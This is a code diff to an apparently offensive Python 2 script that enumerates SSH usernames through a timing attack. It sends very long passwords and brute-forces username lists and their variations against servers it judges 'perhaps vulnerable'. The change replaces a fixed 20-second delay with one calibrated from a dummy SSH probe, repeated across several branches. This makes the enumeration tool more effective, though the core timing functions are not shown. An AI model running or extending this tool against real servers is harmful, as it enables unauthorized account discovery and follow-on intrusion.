@@ -52,7 +52,7 @@ def main():
 	parse.add_argument('-p', action='store', dest='port', help='Host port.')
 	parse.add_argument('-L', action='store', dest='ufile', help='Username list file.')
 	parse.add_argument('-U', action='store', dest='user', help='Only use a single username.')
-	parse.add_argument('-d', action='store', dest='delay', help='Time delay in seconds (default 20 seconds).')
+	parse.add_argument('-d', action='store', dest='delay', help='Time delay fixed in seconds. If not, delay time is calculated.')
 	parse.add_argument('-v', action='store', dest='vari',default = 'yes', help='Make variations of the username (default yes).')
 	parse.add_argument('-o', action='store', dest='outp', help='Output file with positive results.')
 	parse.add_argument('-l', action='store', dest='length', default='40', help='Length of the password in characters (x1000) (default 40).')
@@ -90,11 +90,11 @@ def main():
 			fileOutput.write("\n")			
 			fileOutput.write("USER(s) FOUND:\n")
 			fileOutput.write("\n")
-		if argus.delay == None:
-			defTime = 20
-			print "[+] Using the default time delay, 20 seconds."
-		else:
+
+		if argus.delay != None:
 			defTime = int(argus.delay)		
+			print "[+] Using a time delay of " + str(defTime) + " seconds."
+
 		if argus.host != None:
 			if "/" in argus.host:
 				try: 
@@ -192,6 +192,10 @@ def main():
 							print "[++] This version is perhaps vulnerable, we continue with the bruteforce attack ..."
 							print
 							print '==============================================================================='
+							if argus.delay == None:
+								delay=dummySSH(host,port,length)
+								defTime=delay*10
+								print "[+] Using a delay of " + str(defTime) + " seconds."
 							userNames = prepareUserNames(userFile,vari)            
 							for userName in userNames:
 								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -209,6 +213,12 @@ def main():
 							print "[-] Nothing to do."
 					else:
 						banner = sshBanner(host,port)
+
+						if argus.delay == None:
+							delay=dummySSH(host,port,length)
+							defTime=delay*10
+							print "[+] Using a delay of " + str(defTime) + " seconds."
+
 						userNames = prepareUserNames(userFile,vari)            
 						for userName in userNames:
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -235,6 +245,11 @@ def main():
 							print "[++] This version is perhaps vulnerable, we continue with the bruteforce attack ..."
 							print
 							print '==============================================================================='
+							if argus.delay == None:
+								delay=dummySSH(host,port,length)
+								defTime=delay*10
+								print "[+] Using a delay of " + str(defTime) + " seconds."
+
 							if vari == 'yes':
 								userNames =  createUserNameVariationsFor(user)
 								userNames = list(set(userNames))
@@ -260,6 +275,12 @@ def main():
 							print "[-] Nothing to do."
 					else:
 						if vari == 'yes':
+
+							if argus.delay == None:
+								delay=dummySSH(host,port,length)
+								defTime=delay*10
+								print "[+] Using a delay of " + str(defTime) + " seconds."
+
 							userNames =  createUserNameVariationsFor(user)
 							userNames = list(set(userNames))
 							for userName in userNames:
@@ -269,6 +290,12 @@ def main():
 									foundUser.append(fUser)
 								sock.close()
 						if vari == 'no':
+
+							if argus.delay == None:
+								delay=dummySSH(host,port,length)
+								defTime=delay*10
+								print "[+] Using a delay of " + str(defTime) + " seconds."
+
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 							fUser = sshTime(host,port,user,sock,defTime,length)
 							if fUser != -1 and fUser !=None:
